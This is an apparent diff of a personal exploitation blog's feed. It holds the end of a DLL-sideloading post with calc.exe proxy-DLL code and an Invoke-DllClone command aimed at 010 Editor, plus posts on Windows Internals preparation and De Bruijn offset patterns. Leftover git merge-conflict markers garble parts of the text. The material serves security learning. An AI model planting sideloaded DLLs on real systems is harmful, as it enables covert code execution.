+&lt;p&gt;&lt;img alt="picture 1" src="../images/49369742dbe0ea41b57696a371613a5574117beee51a7cf96318b04763785fb5.png"&gt;  &lt;/p&gt;
+&lt;p&gt;In the next section it will analyse the probable attackable libraries and gives an exploitabilty suggestion:
+&lt;img alt="picture 2" src="../images/38019f07c834ac302e5f4c84eba042d7d9a2836f8f507832967946b3a8177bda.png"&gt;  &lt;/p&gt;
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+Here you can see, which dll's one would have to place and where.
+=======
+Here you can see, which DLL's one would have to place and where.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc
+A nice next step would be to get which of the vulnerable marked locations are writeable to us.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;Koppeling&lt;/h3&gt;
+&lt;p&gt;When placing a DLL with our attack code, we quickly realize the need to provide all the functions that the main binary wants to import from the library. This challenge is addressed by using &lt;a href="https://github.com/monoxgas/Koppeling"&gt;koppeling&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;Koppeling is a tool that allows us to provide the original desired DLL and our attacker code separately. It facilitates the merging of these components, ensuring that all the required functions are available for the application.&lt;/p&gt;
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+I use &lt;a href="https://github.com/jfmaes/Invoke-DLLClone"&gt;Invoke-DLLClone&lt;/a&gt;, which uses Koppeling inside, since I had problems with the original code. Then we just need some dll code like this:
+=======
+I use &lt;a href="https://github.com/jfmaes/Invoke-DLLClone"&gt;Invoke-DLLClone&lt;/a&gt;, which uses Koppeling inside, since I had problems with the original code. Then we just need some DLL code like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;quot;pch.h&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WINAPI&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fireLazor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LPVOID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpParameter&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;WinExec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;calc.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="n"&gt;BOOL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;APIENTRY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DllMain&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HMODULE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hModule&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ul_reason_for_call&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPVOID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpReserved&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;switch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ul_reason_for_call&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_PROCESS_ATTACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fireLazor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;CloseHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_THREAD_ATTACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_THREAD_DETACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_PROCESS_DETACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Example&lt;/h3&gt;
+&lt;p&gt;I will attack 010 editor. As we saw before, its version.dll is vulnerable.&lt;/p&gt;
+&lt;p&gt;Compile the source code from above with Visual Studio as a DLL library and run&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Invoke-DllClone&lt;/span&gt; &lt;span class="n"&gt;-Source&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;System32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt; &lt;span class="n"&gt;-target&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Dll1&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x64&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Release&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;urname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt; &lt;span class="n"&gt;-output&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt; &lt;span class="n"&gt;-sign&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Placing it in the same directory as 010 editor and running it will cause this:&lt;/p&gt;
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+&lt;img alt="picture 3" src="../images/aed4d3a15b0f37c3c97b5f5b5ba5a23b950a4742a951ec51dae51ae7a9594800.png"&gt;&lt;br&gt;
+=======&lt;/p&gt;
+&lt;p&gt;&lt;img alt="picture 4" src="../images/751f81fedc6f887b1a11848c7b64673a878e2f0dcefdbbe7c000a117b6e71a12.png"&gt;  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Downgrading&lt;/h2&gt;
+&lt;p&gt;Most of the time, I consider myself to be in a lower privileged position and contemplate injecting my code somewhere. However, there is another attack against DLL sideloading known as downgrading. This attack may be challenging or ineffective in low-privilege situations, but it becomes particularly interesting in higher privilege scenarios.&lt;/p&gt;
+&lt;p&gt;With downgrading, we can replace a DLL with a known vulnerable version. If the other imported functions remain intact, the loading process will succeed (although there may be cases where the output of the functions has changed, resulting in runtime issues, but this is not very common).&lt;/p&gt;
+&lt;p&gt;A downgraded attack-code-free DLL is extremely difficult for the blue team to track. In fact, it can even be an officially signed DLL. Of course, it's essential to have an appropriate exploit to make use of this technique, so keep that in mind.&lt;/p&gt;</content><category term="Red"></category><category term="Koppeling"></category><category term="DLL"></category><category term="Sideload"></category><category term="Sideloading"></category><category term="Red-Team"></category><category term="Windows"></category></entry><entry><title>Preparing for Windows Internals for Security Engineers</title><link href="https://blog.riskreduction.net/preparing-for-windows-internals-for-security-engineers.html" rel="alternate"></link><published>2023-05-08T13:00:00+02:00</published><updated>2023-05-08T13:00:00+02:00</updated><author><name>gbaru</name></author><id>tag:blog.riskreduction.net,2023-05-08:/preparing-for-windows-internals-for-security-engineers.html</id><summary type="html">&lt;p&gt;In mid of May I have the honor to participate in the Windows Internals 4-day training at OffensiveCon. Since I want to come prepared there are some things I will do beforehand. For anyone else going for the training or wanting to check out its topics this might come in …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In mid of May I have the honor to participate in the Windows Internals 4-day training at OffensiveCon. Since I want to come prepared there are some things I will do beforehand. For anyone else going for the training or wanting to check out its topics this might come in handy.&lt;/p&gt;
+&lt;h2&gt;General Preperation&lt;/h2&gt;
+&lt;p&gt;I will go with a split process of reading the new Windows Internals Books and watching the videos on Plural Sight to Windows 11 from Pavel Yosifovich (payed content). They both have the same topic, the books have more depth, but are somewhat harder and more time consuming to go through.&lt;/p&gt;
+&lt;p&gt;The videos are very good, but sometimes lack on a certain topic. Everytime one option gets boring or I find myself not progressing I switch to the other method.&lt;/p&gt;
+&lt;h2&gt;Specific Preperation&lt;/h2&gt;
+&lt;p&gt;After that I go trough the description of the training and on every buzzword I don't know of, I will research about the contents.&lt;/p&gt;
+&lt;p&gt;The buzzwords per OS version are:&lt;/p&gt;
+&lt;p&gt;Windows 11:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;GRU bootkits &lt;/li&gt;
+&lt;li&gt;PLA software supply chain implants&lt;/li&gt;
+&lt;li&gt;NSA Backdoors&lt;/li&gt;
+&lt;li&gt;Kernel Data Protection (KDP)&lt;/li&gt;
+&lt;li&gt;eXtended Control Flow Guard (XFG)&lt;/li&gt;
+&lt;li&gt;Kernel Control-flow Enforcement Technology (KCET)&lt;/li&gt;
+&lt;li&gt;System Guard Runtime Assertions&lt;/li&gt;
+&lt;li&gt;Secure Launch framework (Intel TXT and AMD SKINIT for new DRTM-based attestation)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Windows 10:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Virtual Trust Levels (VTL)&lt;/li&gt;
+&lt;li&gt;Virtualization Based Security (VBS)&lt;/li&gt;
+&lt;li&gt;Hyper Visor Code Integrity (HVCI)&lt;/li&gt;
+&lt;li&gt;Kernel Control Flow Guard (KCFG)&lt;/li&gt;
+&lt;li&gt;Software Guard Extensions (SGX)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Windows 8.1:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Protected Process Light&lt;/li&gt;
+&lt;li&gt;Custome Code Signing Policies&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Windows 8:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;AppContainer&lt;/li&gt;
+&lt;li&gt;Secure Boot&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Windows 7:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Object Manager data structures&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Resources to the Topics&lt;/h3&gt;
+&lt;p&gt;&lt;span style="color:blue"&gt;GRU Rootkits&lt;/span&gt; seems to be made up or at least I can't find anything about it. I guess GRU is something russian... or the (good) villain from minions. Anyway, its a rootkit and therefore just a kernel malware.&lt;/p&gt;
+&lt;p&gt;Sadly again, no idea what &lt;span style="color:blue"&gt;PLA&lt;/span&gt; stands for. But its about supply chain attacks. I don't see how preparation for that would help me for the course.&lt;/p&gt;
+&lt;p&gt;&lt;span style="color:blue"&gt;NSA Backdoors&lt;/span&gt; is at least something known. So the text goes on to describe the above three as kernel and firmware malware.&lt;/p&gt;
+&lt;p&gt;My understanding is its about modified kernels or drivers.
+Therefore preparing would be to learn about offensive driver development (they run in the kernel). I took the course from &lt;a href="https://training.zeropointsecurity.co.uk/courses/offensive-driver-development"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Also there is a book from Pavel about Windows Kernel Programming, which I will go through.&lt;/p&gt;
+&lt;p&gt;Next we have &lt;span style="color:blue"&gt;Kernel Data Protection (KDP)&lt;/span&gt;. It is explained &lt;a href="https://www.microsoft.com/en-us/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/"&gt;here&lt;/a&gt;. It is a mechanism to mark parts of kernel and driver as read only data. A copy or other way of attestation of the data is hold in the hypervisor through VBS (read on for VBS).&lt;/p&gt;
+&lt;p&gt;For &lt;span style="color:blue"&gt;eXtended Control Flow Guard (XFG)&lt;/span&gt; a good start is &lt;a href="https://connormcgarr.github.io/examining-xfg/"&gt;here&lt;/a&gt;, followed with &lt;a href="https://www.offsec.com/offsec/extended-flow-guard/"&gt;that&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The &lt;span style="color:blue"&gt;Kernel Control-flow Enforcement Technology (KCET)&lt;/span&gt; seems to be very new. I just read about normal CET &lt;a href="https://windows-internals.com/cet-on-windows/"&gt;here&lt;/a&gt; to get a basic understanding.
+It uses a "Shadow Stack" which holds a copy of all return addresses used by the program. That way its not possible to overwrite the return address of a function without being noticed. I would assume that a shadow stack in a hypervisor will do the same for the kernel.&lt;/p&gt;
+&lt;p&gt;&lt;span style="color:blue"&gt;System Guard Runtime Attestation&lt;/span&gt; is written about &lt;a href="https://www.microsoft.com/en-us/security/blog/2018/04/19/introducing-windows-defender-system-guard-runtime-attestation/"&gt;here&lt;/a&gt;  &lt;/p&gt;
+&lt;p&gt;&lt;span style="color:blue"&gt;Secure Launch framework&lt;/span&gt; seems to be for secure boot.
+I am not interested so much, but &lt;a href="https://community.amd.com/t5/business/amd-and-microsoft-secured-core-pc/ba-p/418204"&gt;here&lt;/a&gt; is good information.&lt;/p&gt;
+&lt;p&gt;From here on everything is in the Windows Internals Books, which should be a very good reference.&lt;/p&gt;</content><category term="Windows"></category><category term="OffensiveCon"></category><category term="Windows Internals"></category><category term="Yarden Shafir"></category></entry><entry><title>De Bruijn Pattern: A Method for Calculating Offsets and the Tools of Trade</title><link href="https://blog.riskreduction.net/de-bruijn-pattern-a-method-for-calculating-offsets-and-the-tools-of-trade.html" rel="alternate"></link><published>2023-05-07T22:00:00+02:00</published><updated>2023-05-07T22:00:00+02:00</updated><author><name>gbaru</name></author><id>tag:blog.riskreduction.net,2023-05-07:/de-bruijn-pattern-a-method-for-calculating-offsets-and-the-tools-of-trade.html</id><summary type="html">&lt;h2&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In the field of binary exploitation, it is a common occurrence to have to determine the offset of our input to a program. In early buffer overflow exploits, a large buffer of repeating characters such as "A" * 400 was often used. However, when overwriting the instruction pointer, the exact …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In the field of binary exploitation, it is a common occurrence to have to determine the offset of our input to a program. In early buffer overflow exploits, a large buffer of repeating characters such as "A" * 400 was often used. However, when overwriting the instruction pointer, the exact location of the overwrite was unknown.&lt;/p&gt;
+&lt;p&gt;To address this issue, the technique of using ever-changing patterns was introduced. For example, a pattern like "...AAACAAADAAAE..." could be used.
+By finding the location of the instruction pointer in the pattern (imagine it pointing to "AAAD"), the offset of the input could be determined. 
+But the de bruijn pattern is even better as you might think by just this example. Because it can also give you the offset of pointing to "AADA" or "ADAA" or "DAAA", since each of this sub-parts are also unique. So any offset into the input pattern can be precisely determined.
+This technique remains an important tool in modern binary exploitation.&lt;/p&gt;
+&lt;h2&gt;Tools&lt;/h2&gt;
+&lt;p&gt;There are many tools available to create such patterns and calculate offsets in binary exploitation. However, I have some opinions and tips I'd like to share.&lt;/p&gt;
+&lt;p&gt;One commonly used tool is the Metasploit Framework, which includes the msf-pattern-create and msf-pattern-offset commands:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf-pattern-create&lt;span class="w"&gt; &lt;/span&gt;-l&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;length&amp;gt;
+
+msf-pattern-offset&lt;span class="w"&gt; &lt;/span&gt;-q&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;pattern&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Although this tool is well-known and recommended by many, I personally do not prefer it due to its clunkiness and difficulty of use on Windows. Additionally, it can be flagged by antivirus software, causing additional problems.&lt;/p&gt;
+&lt;p&gt;For these reasons, I prefer to use radare2 and its ragg2 tool, which works well on Windows, Linux, and Mac:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ragg2&lt;span class="w"&gt; &lt;/span&gt;-P&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;length&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-r
+
+ragg2&lt;span class="w"&gt; &lt;/span&gt;-P&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;length&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;-q&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;offset&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# offset as 0x....&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;One limitation of ragg2 is that it can only create one pattern with a predefined alphabet. This limitation can be problematic when working with input buffers that contain so-called "bad characters" that the target program does not handle correctly.&lt;/p&gt;
+&lt;p&gt;An alternative tool to overcome this limitation is pwntools pwnlib. Although its usage requires coding, it is very simple and can easily be accomplished with a few lines of code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Define your custom alphabet&lt;/span&gt;
+&lt;span class="n"&gt;alphabet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;abcdefghijklmnopqrstuvwxyz&amp;#39;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Generate a cyclic pattern with a length of 200 using the custom alphabet&lt;/span&gt;
+&lt;span class="n"&gt;pattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cyclic&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;alphabet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Find the offset of a later specified value in the pattern&lt;/span&gt;
+&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cyclic_find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mnaa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;alphabet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Print the offset&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Offset: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;It's worth noting that Metasploit's pattern-create command does have an option (-s) for specifying a custom alphabet.&lt;/p&gt;
+&lt;p&gt;Other tools such as mona.py (Python2) or PEDA (only for GDB) are also available. However, they each have limitations that make me hesitant to include them in my general toolset.&lt;/p&gt;
+&lt;h2&gt;Alphabets in patterns&lt;/h2&gt;
+&lt;p&gt;Lets think about the alphabets for a second. In case we have a limitation and we want to switch to other characters, just how many would we need for creating a fitting buffer?&lt;/p&gt;
+&lt;p&gt;The chars in these patterns are normaly a byte wide, which means on a 32-bit system 4 chars will be filling 1 register.
+So we have alphabet size ^ 4.&lt;/p&gt;
+&lt;p&gt;This comes down to&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mf"&gt;2&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;chars&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;16&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;maximal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="n"&gt;gth&lt;/span&gt;
+&lt;span class="mf"&gt;5&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;chars&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;625&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;maximal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="n"&gt;gth&lt;/span&gt;
+&lt;span class="mf"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chars&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;maximal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="n"&gt;gth&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On 64-bit systems its even easier, since it will be alphabet size ^ 8&lt;/p&gt;</content><category term="General"></category><category term="offset"></category><category term="brujin"></category><category term="debrujin"></category></entry><entry><title>Hello to my Blog</title><link href="https://blog.riskreduction.net/hello-to-my-blog.html" rel="alternate"></link><published>2023-05-06T22:10:00+02:00</published><updated>2023-05-06T22:10:00+02:00</updated><author><name>gbaru</name></author><id>tag:blog.riskreduction.net,2023-05-06:/hello-to-my-blog.html</id><summary type="html">&lt;p&gt;Hello ppl,&lt;/p&gt;
+&lt;p&gt;this will be my blog, where I write about binary exploitation.
+I will focus on Windows mostly, at least till end of 2025.&lt;/p&gt;
+&lt;p&gt;Currently I work on finishing Offensive Security's OSED Course (EXP-301) and
+will have the Windows Internals Training at OffensiveCon in the mid of May.&lt;/p&gt;
